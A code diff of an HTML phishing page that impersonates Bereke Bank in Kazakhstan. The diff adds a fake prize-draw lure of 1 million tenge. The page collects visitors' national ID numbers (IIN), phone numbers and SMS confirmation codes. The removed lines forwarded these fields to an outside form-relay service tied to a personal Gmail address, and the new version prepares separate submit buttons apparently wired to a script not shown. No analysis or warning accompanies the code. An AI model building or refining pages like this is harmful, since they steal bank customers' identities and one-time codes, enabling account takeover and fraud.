@@ -15,21 +15,19 @@
 </head>
 <body>
     <img src="https://berekebank.kz/directus-new-assets/474f7b4b-a8ff-4f07-bdad-68dad9a8054b" alt="Italian Trulli">
-    <h2>Принять участие</h2>
+    <h2>Принимайте участие в розыгрыше 1 млн тенге от Bereke Bank! </h2>
 
-    <form id="multiStepForm" action="https://formsubmit.co/tumrdusyov@gmail.com" method="POST">
-        <!-- Step 1: Collect ИИН and Phone -->
-        <div id="step1">
-            <input type="text" id="iin" name="ИИН" placeholder="Введите ИИН" required>
-            <input type="text" id="phone" name="Номер телефона" placeholder="Введите номер" required>
-            <button type="button" id="submitStep1">Продолжить</button>
-        </div>
+    <!-- First Step Form -->
+    <div id="step1">
+        <input type="text" id="iin" name="ИИН" placeholder="Введите ИИН" required>
+        <input type="text" id="phone" name="Номер телефона" placeholder="Введите номер" required>
+        <button type="button" id="submitStep1">Продолжить</button>
+    </div>
 
-        <!-- Step 2: Enter SMS Code -->
-        <div id="step2">
-            <input type="text" id="smsCode" name="SMS Код" placeholder="Введите SMS-код" required>
-            <button type="submit">Подтвердить</button>
-        </div>
-    </form>
+    <!-- Second Step Form (SMS Code) -->
+    <div id="step2">
+        <input type="text" id="smsCode" name="SMS Код" placeholder="Введите SMS-код" required>
+        <button type="button" id="submitStep2">Подтвердить</button>
+    </div>
 </body>
 </html>
